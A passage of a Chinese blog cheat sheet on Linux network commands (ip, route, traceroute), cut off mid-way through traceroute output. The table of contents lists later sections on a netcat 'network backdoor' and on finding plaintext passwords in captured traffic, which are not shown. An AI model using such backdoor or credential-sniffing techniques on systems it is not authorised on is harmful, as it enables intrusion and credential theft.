                    <a href="#%e5%88%97%e5%87%ba%e8%bf%9b%e7%a8%8b%e4%bd%bf%e7%94%a8%e7%9a%84%e6%96%87%e4%bb%b6" aria-label="列出进程使用的文件">列出进程使用的文件</a></li>
                <li>
                    <a href="#%e6%89%be%e5%88%b0%e4%bd%bf%e7%94%a8%e6%96%87%e4%bb%b6%e7%9a%84%e8%bf%9b%e7%a8%8b" aria-label="找到使用文件的进程">找到使用文件的进程</a></li>
                <li>
                    <a href="#%e5%88%97%e5%87%ba%e7%9b%ae%e5%bd%95%e4%b8%ad%e6%89%80%e6%9c%89%e6%89%93%e5%bc%80%e7%9a%84%e6%96%87%e4%bb%b6" aria-label="列出目录中所有打开的文件">列出目录中所有打开的文件</a></li>
                <li>
                    <a href="#%e5%88%97%e5%87%ba%e7%bd%91%e7%bb%9c%e6%96%87%e4%bb%b6" aria-label="列出网络文件">列出网络文件</a></li>
                <li>
                    <a href="#%e6%a0%b9%e6%8d%ae%e7%bd%91%e7%bb%9c%e8%bf%9e%e6%8e%a5%e7%b1%bb%e5%9e%8b%e6%9d%a5%e6%9f%a5%e6%89%be%e6%96%87%e4%bb%b6" aria-label="根据网络连接类型来查找文件">根据网络连接类型来查找文件</a></li>
                <li>
                    <a href="#%e6%8b%bf%e5%88%b0%e8%bf%9b%e7%a8%8b%e7%9a%84%e7%88%b6%e8%bf%9b%e7%a8%8bid" aria-label="拿到进程的父进程ID">拿到进程的父进程ID</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e7%94%a8%e6%88%b7%e7%9a%84%e7%bd%91%e7%bb%9c%e8%bf%9e%e6%8e%a5" aria-label="查看用户的网络连接">查看用户的网络连接</a></li>
                <li>
                    <a href="#%e5%88%97%e5%87%ba%e6%89%80%e6%9c%89%e5%86%85%e5%ad%98%e6%98%a0%e5%b0%84%e6%96%87%e4%bb%b6" aria-label="列出所有内存映射文件">列出所有内存映射文件</a></li></ul>
                </li>
                <li>
                    <a href="#route" aria-label="route">route</a><ul>
                        
                <li>
                    <a href="#%e6%b7%bb%e5%8a%a0%e9%bb%98%e8%ae%a4%e7%bd%91%e5%85%b3" aria-label="添加默认网关">添加默认网关</a></li>
                <li>
                    <a href="#%e6%b7%bb%e5%8a%a0%e4%b8%80%e6%9d%a1%e8%b7%af%e7%94%b1" aria-label="添加一条路由">添加一条路由</a></li>
                <li>
                    <a href="#%e5%88%97%e5%87%ba%e5%86%85%e6%a0%b8%e8%b7%af%e7%94%b1%e8%a1%a8%e4%bf%a1%e6%81%af" aria-label="列出内核路由表信息">列出内核路由表信息</a></li>
                <li>
                    <a href="#%e6%8b%92%e7%bb%9d%e8%b7%af%e7%94%b1%e5%88%b0%e7%89%b9%e5%ae%9a%e7%9a%84%e4%b8%bb%e6%9c%ba" aria-label="拒绝路由到特定的主机">拒绝路由到特定的主机</a></li>
                <li>
                    <a href="#%e5%88%a0%e9%99%a4%e4%b8%80%e6%9d%a1%e8%b7%af%e7%94%b1" aria-label="删除一条路由">删除一条路由</a></li></ul>
                </li>
                <li>
                    <a href="#ncat--netcatnc--nmap" aria-label="ncat &amp;amp; netcat(nc) &amp;amp; nmap">ncat &amp; netcat(nc) &amp; nmap</a><ul>
                        
                <li>
                    <a href="#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f-1" aria-label="端口扫描">端口扫描</a></li>
                <li>
                    <a href="#%e5%9c%a8%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%97%b4%e4%bc%a0%e9%80%81%e6%96%87%e4%bb%b6" aria-label="在服务器间传送文件">在服务器间传送文件</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8netcat%e5%ae%9e%e7%8e%b0%e4%b8%80%e4%b8%aa%e5%91%bd%e4%bb%a4%e8%a1%8c%e8%81%8a%e5%a4%a9%e6%9c%8d%e5%8a%a1%e5%99%a8" aria-label="使用netcat实现一个命令行聊天服务器">使用netcat实现一个命令行聊天服务器</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8nc%e5%88%9b%e5%bb%ba%e4%b8%80%e4%b8%aaweb%e6%9c%8d%e5%8a%a1%e5%99%a8" aria-label="使用nc创建一个web服务器">使用nc创建一个web服务器</a></li>
                <li>
                    <a href="#%e7%bd%91%e7%bb%9c%e6%95%85%e9%9a%9c%e6%8e%92%e6%9f%a5" aria-label="网络故障排查">网络故障排查</a></li>
                <li>
                    <a href="#%e6%9f%a5%e6%89%be%e7%ab%af%e5%8f%a3%e4%b8%8a%e8%bf%90%e8%a1%8c%e7%9a%84%e6%9c%8d%e5%8a%a1" aria-label="查找端口上运行的服务">查找端口上运行的服务</a></li>
                <li>
                    <a href="#%e7%bd%91%e7%bb%9c%e5%90%8e%e9%97%a8-1" aria-label="网络后门">网络后门</a></li>
                <li>
                    <a href="#%e6%a3%80%e6%9f%a5%e4%b8%80%e4%b8%aaudp%e7%ab%af%e5%8f%a3" aria-label="检查一个udp端口">检查一个udp端口</a></li></ul>
                </li>
                <li>
                    <a href="#tcpdump-supa-href11asup" aria-label="tcpdump [1]">tcpdump <sup><a href="#1">[1]</a></sup></a><ul>
                        
                <li>
                    <a href="#%e6%8d%95%e8%8e%b7%e6%89%80%e6%9c%89%e7%bd%91%e7%bb%9c%e6%8e%a5%e5%8f%a3" aria-label="捕获所有网络接口">捕获所有网络接口</a></li>
                <li>
                    <a href="#%e6%8c%89ip%e6%9f%a5%e6%89%be%e6%b5%81%e9%87%8f" aria-label="按IP查找流量">按IP查找流量</a></li>
                <li>
                    <a href="#%e6%8c%89%e6%ba%90%e7%9b%ae%e7%9a%84-%e5%9c%b0%e5%9d%80%e8%bf%87%e6%bb%a4" aria-label="按源/目的 地址过滤">按源/目的 地址过滤</a></li>
                <li>
                    <a href="#%e9%80%9a%e8%bf%87%e7%bd%91%e7%bb%9c%e6%9f%a5%e6%89%be%e6%95%b0%e6%8d%ae%e5%8c%85" aria-label="通过网络查找数据包">通过网络查找数据包</a></li>
                <li>
                    <a href="#%e4%bd%bf%e7%94%a8%e5%8d%81%e5%85%ad%e8%bf%9b%e5%88%b6%e8%be%93%e5%87%ba%e6%95%b0%e6%8d%ae%e5%8c%85%e5%86%85%e5%ae%b9" aria-label="使用十六进制输出数据包内容">使用十六进制输出数据包内容</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e7%89%b9%e5%ae%9a%e7%ab%af%e5%8f%a3%e7%9a%84%e6%b5%81%e9%87%8f" aria-label="查看特定端口的流量">查看特定端口的流量</a></li>
                <li>
                    <a href="#%e6%9f%a5%e6%89%be%e7%ab%af%e5%8f%a3%e8%8c%83%e5%9b%b4%e7%9a%84%e6%b5%81%e9%87%8f" aria-label="查找端口范围的流量">查找端口范围的流量</a></li>
                <li>
                    <a href="#%e8%bf%87%e6%bb%a4%e5%8c%85%e7%9a%84%e5%a4%a7%e5%b0%8f" aria-label="过滤包的大小">过滤包的大小</a></li>
                <li>
                    <a href="#%e6%8d%95%e8%8e%b7%e6%b5%81%e9%87%8f%e8%be%93%e5%87%ba%e4%b8%ba%e6%96%87%e4%bb%b6" aria-label="捕获流量输出为文件">捕获流量输出为文件</a></li>
                <li>
                    <a href="#%e7%bb%84%e5%90%88%e6%9d%a1%e4%bb%b6" aria-label="组合条件">组合条件</a></li>
                <li>
                    <a href="#%e5%8e%9f%e5%a7%8b%e8%be%93%e5%87%ba" aria-label="原始输出">原始输出</a></li>
                <li>
                    <a href="#ip%e5%88%b0%e7%ab%af%e5%8f%a3" aria-label="IP到端口">IP到端口</a></li>
                <li>
                    <a href="#%e5%8e%bb%e9%99%a4%e7%89%b9%e5%ae%9a%e6%b5%81%e9%87%8f" aria-label="去除特定流量">去除特定流量</a></li>
                <li>
                    <a href="#%e9%80%89%e9%a1%b9%e5%88%86%e7%bb%84" aria-label="选项分组">选项分组</a></li>
                <li>
                    <a href="#%e8%bf%87%e6%bb%a4tcp%e6%a0%87%e8%ae%b0%e4%bd%8d" aria-label="过滤TCP标记位">过滤TCP标记位</a></li>
                <li>
                    <a href="#%e6%9f%a5%e6%89%behttp%e5%8c%85" aria-label="查找http包">查找http包</a></li>
                <li>
                    <a href="#%e6%9f%a5%e6%89%bedns%e6%b5%81%e9%87%8f" aria-label="查找DNS流量">查找DNS流量</a></li>
                <li>
                    <a href="#%e6%9f%a5%e6%89%be%e5%af%b9%e5%ba%94%e6%b5%81%e9%87%8f%e7%9a%84%e6%98%8e%e6%96%87%e5%af%86%e7%a0%81" aria-label="查找对应流量的明文密码">查找对应流量的明文密码</a></li>
                <li>
                    <a href="#arp" aria-label="arp">arp</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8barp%e6%9d%a1%e7%9b%ae" aria-label="查看arp条目">查看arp条目</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%ba%e4%b8%80%e4%b8%aa%e7%89%b9%e5%ae%9a%e7%9a%84arp%e6%9d%a1%e7%9b%ae" aria-label="显示一个特定的arp条目">显示一个特定的arp条目</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%ba%e6%8c%87%e5%ae%9a%e6%8e%a5%e5%8f%a3%e7%9a%84arp%e7%bc%93%e5%ad%98%e8%a1%a8" aria-label="显示指定接口的arp缓存表">显示指定接口的arp缓存表</a></li>
                <li>
                    <a href="#%e5%88%a0%e9%99%a4%e4%b8%80%e4%b8%aaarp%e6%9d%a1%e7%9b%ae" aria-label="删除一个arp条目">删除一个arp条目</a></li>
                <li>
                    <a href="#%e5%90%91arp%e7%bc%93%e5%ad%98%e6%b7%bb%e5%8a%a0%e4%b8%80%e4%b8%aa%e6%9d%a1%e7%9b%ae" aria-label="向arp缓存添加一个条目">向arp缓存添加一个条目</a></li>
                <li>
                    <a href="#%e6%b8%85%e7%a9%baarp%e7%bc%93%e5%ad%98%e8%a1%a8" aria-label="清空arp缓存表">清空arp缓存表</a></li>
                <li>
                    <a href="#%e6%98%be%e7%a4%ba%e6%a0%bc%e5%bc%8f" aria-label="显示格式">显示格式</a></li></ul>
                </li>
                <li>
                    <a href="#arp-scan" aria-label="arp-scan">arp-scan</a><ul>
                        
                <li>
                    <a href="#%e6%89%ab%e6%8f%8f%e6%9c%ac%e5%9c%b0%e7%bd%91%e7%bb%9c" aria-label="扫描本地网络">扫描本地网络</a></li>
                <li>
                    <a href="#%e8%ae%be%e7%bd%ae%e6%ba%90mac" aria-label="设置源mac">设置源mac</a></li>
                <li>
                    <a href="#%e5%8f%91%e7%8e%b0%e7%bd%91%e7%bb%9c%e5%86%b2%e7%aa%81" aria-label="发现网络冲突">发现网络冲突</a></li></ul>
                </li>
                <li>
                    <a href="#ethtool" aria-label="ethtool">ethtool</a><ul>
                        
                <li>
                    <a href="#%e5%88%97%e5%87%ba%e4%bb%a5%e5%a4%aa%e7%bd%91%e8%ae%be%e5%a4%87%e5%b1%9e%e6%80%a7" aria-label="列出以太网设备属性">列出以太网设备属性</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e7%bd%91%e7%bb%9c%e6%8e%a5%e5%8f%a3%e4%ba%8e%e5%ae%b9%e5%99%a8%e5%86%85%e6%8e%a5%e5%8f%a3%e7%9a%84%e5%af%b9%e5%ba%94%e5%85%b3%e7%b3%bb" aria-label="查看网络接口于容器内接口的对应关系">查看网络接口于容器内接口的对应关系</a></li></ul>
                </li>
                <li>
                    <a href="#nsenter" aria-label="nsenter">nsenter</a><ul>
                        
                <li>
                    <a href="#%e5%a6%82%e4%bd%95%e5%ae%9a%e4%bd%8dpod%e5%90%8d%e7%a7%b0%e7%a9%ba%e9%97%b4" aria-label="如何定位Pod名称空间">如何定位Pod名称空间</a></li></ul>
                </li>
                <li>
                    <a href="#paping" aria-label="paping">paping</a></li>
                <li>
                    <a href="#mtr" aria-label="mtr">mtr</a><ul>
                        
                <li>
                    <a href="#%e7%ae%80%e5%8d%95%e7%9a%84%e4%bd%bf%e7%94%a8%e7%a4%ba%e4%be%8b" aria-label="简单的使用示例">简单的使用示例</a></li>
                <li>
                    <a href="#mtr%e8%be%93%e5%87%ba%e7%9a%84%e6%95%b0%e6%8d%ae" aria-label="mtr输出的数据">mtr输出的数据</a></li>
                <li>
                    <a href="#%e4%b8%a2%e5%8c%85%e5%88%a4%e6%96%ad" aria-label="丢包判断">丢包判断</a></li>
                <li>
                    <a href="#%e5%bb%b6%e8%bf%9f%e5%88%a4%e6%96%ad" aria-label="延迟判断">延迟判断</a></li></ul>
                </li>
                <li>
                    <a href="#brctl-supa-href55asup" aria-label="brctl [5]">brctl <sup><a href="#5">[5]</a></sup></a><ul>
                        
                <li>
                    <a href="#%e6%98%be%e7%a4%ba%e6%89%80%e6%9c%89%e5%90%af%e7%94%a8%e7%9a%84%e7%bd%91%e6%a1%a5%e7%9a%84%e8%ae%be%e5%a4%87" aria-label="显示所有启用的网桥的设备">显示所有启用的网桥的设备</a></li>
                <li>
                    <a href="#%e5%88%9b%e5%bb%ba%e7%bd%91%e6%a1%a5" aria-label="创建网桥">创建网桥</a></li>
                <li>
                    <a href="#%e5%9c%a8%e7%bd%91%e6%a1%a5%e4%b8%8a%e6%b7%bb%e5%8a%a0%e6%8e%a5%e5%8f%a3" aria-label="在网桥上添加接口">在网桥上添加接口</a></li>
                <li>
                    <a href="#%e5%88%a0%e9%99%a4%e7%bd%91%e6%a1%a5" aria-label="删除网桥">删除网桥</a></li>
                <li>
                    <a href="#%e6%a3%80%e6%9f%a5%e7%bd%91%e6%a1%a5-stf-%e4%bf%a1%e6%81%af" aria-label="检查网桥 STF 信息">检查网桥 STF 信息</a></li>
                <li>
                    <a href="#%e4%bb%8e%e7%bd%91%e6%a1%a5%e4%b8%8a%e5%88%a0%e9%99%a4%e6%8e%a5%e5%8f%a3" aria-label="从网桥上删除接口">从网桥上删除接口</a></li>
                <li>
                    <a href="#%e5%bc%80%e5%90%af%e5%85%b3%e9%97%ad%e7%94%9f%e6%88%90%e6%a0%91%e5%8d%8f%e8%ae%ae" aria-label="开启/关闭生成树协议">开启/关闭生成树协议</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e7%bd%91%e6%a1%a5%e4%b8%8a%e5%ad%a6%e5%88%b0%e7%9a%84mac%e5%9c%b0%e5%9d%80" aria-label="查看网桥上学到的MAC地址">查看网桥上学到的MAC地址</a></li>
                <li>
                    <a href="#%e4%bf%ae%e6%94%b9stp%e5%80%bc" aria-label="修改STP值">修改STP值</a></li></ul>
                </li>
                <li>
                    <a href="#bridge-supa-href66asup" aria-label="bridge [6]">bridge <sup><a href="#6">[6]</a></sup></a><ul>
                        
                <li>
                    <a href="#bridge-vs-brct-supa-href77asup" aria-label="bridge vs brct [7]">bridge vs brct <sup><a href="#7">[7]</a></sup></a></li></ul>
                </li>
                <li>
                    <a href="#reference" aria-label="Reference">Reference</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content">
    





<div class="copyrightTopBlock">
    <p>本文发布于<a href="https://www.oomkill.com/about" target="_blank">Cylon的收藏册</a>，转载请著名原文链接~</p>
    <div class="articleSuffix-bg"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 147.78 155.96"> <path d="M10.5,99.81a1.9,1.9,0,0,0-.53-.09,1.66,1.66,0,0,0-1.64,1.65A1.64,1.64,0,0,0,10,103a1.57,1.57,0,0,0,.87-.25l26.76,26.82.45-1.08L11.52,101.91A1.65,1.65,0,0,0,10.5,99.81Zm-.13,2a.57.57,0,0,1-.8,0,.58.58,0,0,1-.17-.41.58.58,0,0,1,.57-.57h0a.57.57,0,0,1,.56.58A.55.55,0,0,1,10.37,101.77Z" style="fill:#c5c9e0"></path><path d="M56.15,117.58H39.06l0-.09a1.65,1.65,0,0,0-1.36-1H37.5a1.65,1.65,0,1,0,1.56,2.19H55.7L92.92,156h41.44v-1.08h-41Zm-18.25.94a.56.56,0,0,1-.79,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.56-.57h0a.58.58,0,0,1,.57.58A.54.54,0,0,1,37.9,118.52Z" style="fill:#c5c9e0"></path><path d="M23.52,50.32a1.65,1.65,0,0,0,1.55-1.11H55.28l48-48.13h31.06V0H102.85l-48,48.13H25.07a1.64,1.64,0,0,0-2.09-1,1.64,1.64,0,0,0,.54,3.2Zm0-2.21a.57.57,0,0,1,0,1.13.57.57,0,1,1,0-1.13Z" style="fill:#c5c9e0"></path><polygon points="102.86 0 102.86 0 102.86 0 102.86 0" style="fill:#c5c9e0"></polygon><path d="M107.72,12.14h26.64V11.07H107.27L57.4,61H3.09a1.66,1.66,0,0,0-1.45-.86H1.52A1.65,1.65,0,1,0,2.81,63a1.59,1.59,0,0,0,.45-.87H57.85ZM2.05,62.23a.57.57,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.56-.57h.09a.57.57,0,0,1,.32,1Z" style="fill:#c5c9e0"></path><path d="M134.36,43.22V42.14h-22.3l-9.62,9.63a1.64,1.64,0,0,0-2.19.77,1.61,1.61,0,0,0-.17.71,1.65,1.65,0,1,0,3.29,0,1.61,1.61,0,0,0-.16-.72l9.3-9.32Zm-32.64,10.6a.57.57,0,0,1,0-1.13.57.57,0,0,1,0,1.13Z" style="fill:#c5c9e0"></path><path d="M147,52.3l-9,9H111.48a1.64,1.64,0,0,0-1.61-1.33h-.14a1.65,1.65,0,1,0,1.6,2.41h27.19l9.26-9.29L147,52.3Zm-37.15,9.85a.56.56,0,0,1-.56-.57h0a.56.56,0,0,1,.56-.56h0a.57.57,0,1,1,0,1.13Z" style="fill:#c5c9e0"></path><path d="M66.79,75.35l11,11.06h56.53V85.33H78.27l-11-11.06H49.49L37.12,86.67a1.64,1.64,0,0,0-2.09,1,1.61,1.61,0,0,0-.09.54,1.65,1.65,0,0,0,3.29,0,1.68,1.68,0,0,0-.26-.89l12-12ZM36.58,88.79a.57.57,0,1,1,.57-.56A.57.57,0,0,1,36.58,88.79Z" style="fill:#c5c9e0"></path><path d="M110.61,95.55,92.8,113.4a1.62,1.62,0,1,0,.77.76l17.49-17.53h23.31V95.55ZM92.49,115.28a.56.56,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.57-.57h0a.58.58,0,0,1,.56.58A.55.55,0,0,1,92.49,115.28Z" style="fill:#c5c9e0"></path><path d="M97.89,122.3H76.62L64.2,109.85a1.65,1.65,0,0,0-.77-2.2,1.77,1.77,0,0,0-.72-.17h-.14a1.65,1.65,0,0,0,.15,3.29,1.58,1.58,0,0,0,.71-.17l12.74,12.77H98.34l17.48-17.52h18.54v-1.08h-19ZM63.12,109.53a.56.56,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,1.14,0A.54.54,0,0,1,63.12,109.53Z" style="fill:#c5c9e0"></path> </svg> </div>
</div>
<br><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">¶</a></h2>
<p>作为系统管理员或程序员，经常需要诊断分析和解决网络问题，而配置、监控与保护网络有助于发现问题并在事情范围扩大前得意解决，并且网络的性能与安全也是管理与诊断网络的重要部分。本文将总结常用与Linux网络管理的命令与使用示例，保持长期更新与更正。</p>
<h2 id="ip">IP<a hidden class="anchor" aria-hidden="true" href="#ip">¶</a></h2>
<p><code>iproute2</code> 包含网络、路由、ARP缓存等的管理与配置的<code>ip</code>命令，用来取代传统的 <code>ifconfig</code> 与 <code>route</code>；<code>ip</code> 使用第二个参数，指定在对象执行的操作（例如，<code>add</code> <code>delete</code> <code>show</code>）。</p>
<p>ip 命令是配置网络接口的强大工具，任何 Linux 系统管理员都应该知道。它用于启动或关闭接口、分配和删除地址和路由、管理 ARP 缓存等等。</p>
<p><code>ip</code> 常用的子命令有：</p>
<ul>
<li><code>link</code> (<code>l</code>)  网络接口管理</li>
<li><code>address</code> (<code>a</code>)  IP地址管理</li>
<li><code>route</code> (<code>r</code>)  路由表管理</li>
<li><code>neigh</code> (<code>n</code>)  arp表管理</li>
</ul>
<blockquote>
<p><strong>各系统下的包名与安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>iproute2</code>  ；<code>apt install iproute2</code></li>
<li>CentOS/Fedora: <code>iproute2</code> ；<code>yum install -y iproute2</code></li>
<li>Apline：<code>iproute2 </code> ；<code>apk add iproute2</code></li>
</ul>
</blockquote>
<h3 id="ip-link">ip link<a hidden class="anchor" aria-hidden="true" href="#ip-link">¶</a></h3>
<p><code>ip link</code> 用于管理和显示网络接口</p>
<h3 id="获取网络接口信息ip-link-show">获取网络接口信息ip link show<a hidden class="anchor" aria-hidden="true" href="#获取网络接口信息ip-link-show">¶</a></h3>
<p>查看特定设备信息</p>
<pre><code class="language-bash">ip link show dev [device]
</code></pre>
<p>查看所有网络接口的统计信息（如传输或丢弃的数据包，错误等等）：</p>
<pre><code class="language-bash">ip -s link
</code></pre>
<p>查看单个网络接口的类似信息：</p>
<pre><code class="language-bash">ip -s link ls [interface]
</code></pre>
<p>例如</p>
<pre><code>$ ip -s link ls eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq state UP mode DEFAULT group default qlen 1000
    link/ether da:78:c8:7a:fb:26 brd ff:ff:ff:ff:ff:ff
    RX: bytes  packets  errors  dropped overrun mcast   
    38626072259 324723879 0       347316  0       0       
    TX: bytes  packets  errors  dropped carrier collsns 
    13404948080 6829250  0       0       0       0       
</code></pre>
<p>如果需要显示更多的详情，可以再添加一个 <code>-s</code></p>
<pre><code class="language-bash">ip -s -s link ls [interface]
</code></pre>
<p>仅查看启动（运行）的接口列表</p>
<pre><code class="language-bash">ip link ls up
</code></pre>
<h3 id="修改网络接口信息-ip-link-set">修改网络接口信息 ip link set<a hidden class="anchor" aria-hidden="true" href="#修改网络接口信息-ip-link-set">¶</a></h3>
<p>查看 <code>ip link</code> 的帮助</p>
<pre><code class="language-bash">ip link help
</code></pre>
<p>启动/关闭网络接口</p>
<pre><code class="language-bash">ip link set [interface] up/down
</code></pre>
<p><code>ip link</code> 可以修改设备传输队列的长度</p>
<pre><code class="language-bash">ip link set txqueuelen [number] dev [interface]
</code></pre>
<p>设置 <strong>MTU</strong> (Maximum Transmission Unit) 来提高网络性能</p>
<pre><code class="language-bash">ip link set mtu [number] dev [interface]
</code></pre>
<p>###查看与管理IP地址 ip addr</p>
<p>显示所有设备</p>
<pre><code class="language-bash">ip addr 
</code></pre>
<p>列出网络接口与IP地址</p>
<pre><code class="language-bash">ip addr show
</code></pre>
<p>查看单个网络设备的信息</p>
<pre><code class="language-bash">ip addr show dev [interface]
</code></pre>
<p>列出 IPv4/IPv6 地址</p>
<pre><code class="language-bash">ip -4 addr
ip -6 addr
</code></pre>
<p>在Linux中添加网络地址</p>
<pre><code class="language-bash">ip addr add [ip_address] dev [interface]
</code></pre>
<p>添加广播地址</p>
<pre><code class="language-bash">ip addr add brd [ip_address] dev [interface]
</code></pre>
<p>删除接口上的网络地址</p>
<pre><code class="language-bash">ip addr del [ip_address] dev [interface]
</code></pre>
<h3 id="管理路由表-ip-route">管理路由表 ip route<a hidden class="anchor" aria-hidden="true" href="#管理路由表-ip-route">¶</a></h3>
<h3 id="显示路由表-ip-route-list">显示路由表 ip route list<a hidden class="anchor" aria-hidden="true" href="#显示路由表-ip-route-list">¶</a></h3>
<pre><code class="language-bash">ip route
ip route list
</code></pre>
<p>选择范围；上述命令列出内核内所有路由条目，如果想要缩小范围可以使用选择器 SELECTOR</p>
<p>语法：<code>ip route list SELECTOR</code></p>
<p><strong>SELECTOR</strong>:</p>
<ul>
<li>
<p><strong>root</strong>：[ local | main | default | all | NUMBER ]</p>
</li>
<li>
<p><strong>match</strong>：</p>
<p>[ match PREFIX ]</p>
</li>
</ul>
<pre><code class="language-bash"> ip route list match 10
</code></pre>
<ul>
<li>
<p><strong>exact</strong>： [ exact PREFIX ]</p>
</li>
<li>
<p><strong>TABLE</strong></p>
<p>[ table TABLE_ID ] [ local | main | default | all | NUMBER ]</p>
</li>
</ul>
<pre><code class="language-bash"> ip route list table local
 
 broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 
 local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 
 local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 
 broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1 
 broadcast 195.133.10.0 dev eth0 proto kernel scope link src 195.133.11.43 
 local 195.133.11.43 dev eth0 proto kernel scope host src 195.133.11.43 
 broadcast 195.133.11.255 dev eth0 proto kernel scope link src 195.133.11.43 
</code></pre>
<ul>
<li>
<p><strong>PROTO</strong></p>
<p>[ proto RTPROTO ] [ kernel | boot | static | NUMBER ]</p>
</li>
</ul>
<pre><code> ip route list proto static
</code></pre>
<ul>
<li>
<p><strong>TYPE</strong></p>
<p>[ type TYPE ] { unicast | local | broadcast | multicast | throw |unreachable | prohibit | blackhole | nat }</p>
</li>
</ul>
<pre><code> ip route list type multicast
</code></pre>
<ul>
<li>
<p><strong>SCOPE</strong></p>
<p>[ scope SCOPE ] [ host | link | global | NUMBER ]</p>
</li>
</ul>
<pre><code> ip route list scope link
 
 169.254.0.0/16 dev eth0 metric 1002 
 172.16.0.0/20 dev eth0 proto kernel src 172.16.0.2 
</code></pre>
<h3 id="修改路由表-ip-route-adddel">修改路由表 ip route add/del<a hidden class="anchor" aria-hidden="true" href="#修改路由表-ip-route-adddel">¶</a></h3>
<p>在指定设备上添加路由条目</p>
<pre><code class="language-bash">ip route add [ip_address] dev [interface]
</code></pre>
<p>通过网关添加新路由</p>
<pre><code class="language-bash">ip route add [ip_address] via [gatewayIP]
</code></pre>
<p>通过本地网关为<strong>所有</strong>地址添加默认路由</p>
<pre><code class="language-bash">ip route add default [ip_address] dev [device]

ip route add default [network/mask] via [gatewayIP]
</code></pre>
<p>删除已经存在的路由表</p>
<pre><code class="language-bash">ip route del [ip_address]
ip route del default
ip route del [ip_address] dev [interface]
</code></pre>
<h3 id="arp地址表管理--ip-neighbor">ARP地址表管理  ip neighbor<a hidden class="anchor" aria-hidden="true" href="#arp地址表管理--ip-neighbor">¶</a></h3>
<h3 id="显示arp-条目-ip-neigh-show">显示arp 条目 ip neigh show<a hidden class="anchor" aria-hidden="true" href="#显示arp-条目-ip-neigh-show">¶</a></h3>
<p>显示系统中设备的MAC地址及其状态。设备存在的状态：</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>REACHABLE</strong></td>
<td>在超时过期之前有效且可访问的条目</td>
</tr>
<tr>
<td><strong>PERMANENT</strong></td>
<td>管理员才能删除的永久条目</td>
</tr>
<tr>
<td><strong>STALE</strong></td>
<td>有效但无法访问的条目；为了检查它的状态，内核在第一次传输时检查</td>
</tr>
</tbody>
</table>
<p>例如</p>
<pre><code class="language-bash">ip neigh show

192.168.10.1 dev eth0 lladdr 00:1f:ce:72:bd:8c REACHABLE
46.17.40.155 dev eth0 lladdr c4:71:fe:f1:9f:3f STALE
2a00:b700:3::1 dev eth0 lladdr 00:1f:ce:72:bd:8c router STALE
fe80::f0c5:a5ff:fee8:2aa4 dev eth0 lladdr f2:c5:a5:e8:2a:a4 router STALE
fe80::a48a:1eff:fe35:c2f7 dev eth0 lladdr a6:8a:1e:35:c2:f7 router STALE
fe80::4c4d:b3ff:fe44:fd58 dev eth0 lladdr 4e:4d:b3:44:fd:58 router STALE
fe80::4c33:dfff:fe92:9f2f dev eth0 lladdr 4e:33:df:92:9f:2f router STALE
fe80::21f:ceff:fe72:bd8c dev eth0 lladdr 00:1f:ce:72:bd:8c router STALE
</code></pre>
<h3 id="修改arp条目-ip-neigh-adddel">修改arp条目 ip neigh add/del<a hidden class="anchor" aria-hidden="true" href="#修改arp条目-ip-neigh-adddel">¶</a></h3>
<pre><code class="language-bash">ip neigh add [ip_address] dev [interface]

ip neigh del [ip_address] dev [interface]
</code></pre>
<h2 id="traceroute">traceroute<a hidden class="anchor" aria-hidden="true" href="#traceroute">¶</a></h2>
<p><code>traceroute</code> 可以追踪数据传输是如何从本地传输到远程的。一个典型的例子是网页的访问。在互联网上加载一个网页需要数据流经一个网络和许多路由器。<code>traceroute</code> 可以显示所采用的路由以及网络上路由器的IP和主机名。它可以应用于排查网络延迟或诊断网络问题。</p>
<blockquote>
<p><strong>各系统下的包名与安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>traceroute</code>  ；<code>apt install traceroute -y</code></li>
<li>CentOS/Fedora: <code>traceroute</code> ；<code>yum install -y traceroute</code></li>
<li>Apline：<code>busybox </code> ；<code>apk add busybox</code></li>
</ul>
</blockquote>
<h3 id="追踪网络主机的路由-traceroute-host">追踪网络主机的路由 traceroute host<a hidden class="anchor" aria-hidden="true" href="#追踪网络主机的路由-traceroute-host">¶</a></h3>
<pre><code class="language-bash">traceroute baidu.com

traceroute to baidu.com (220.181.38.148), 30 hops max, 60 byte packets
 1  * 9.31.61.129 (9.31.61.129)  1.795 ms *
 2  9.31.123.98 (9.31.123.98)  0.907 ms  1.179 ms  1.416 ms
 3  10.196.18.109 (10.196.18.109)  0.866 ms 10.196.18.125 (10.196.18.125)  1.085 ms *
 4  10.162.33.5 (10.162.33.5)  1.297 ms 10.200.16.169 (10.200.16.169)  0.774 ms 10.196.92.109 (10.196.92.109)  1.218 ms
 5  10.162.32.145 (10.162.32.145)  1.539 ms  1.431 ms 10.162.32.149 (10.162.32.149)  1.310 ms
 6  * * *
 7  58.63.249.45 (58.63.249.45)  7.320 ms * 121.14.50.25 (121.14.50.25)  7.859 ms
 8  * * 113.96.4.121 (113.96.4.121)  4.887 ms
 9  202.97.22.149 (202.97.22.149)  32.481 ms 202.97.22.153 (202.97.22.153)  32.676 ms
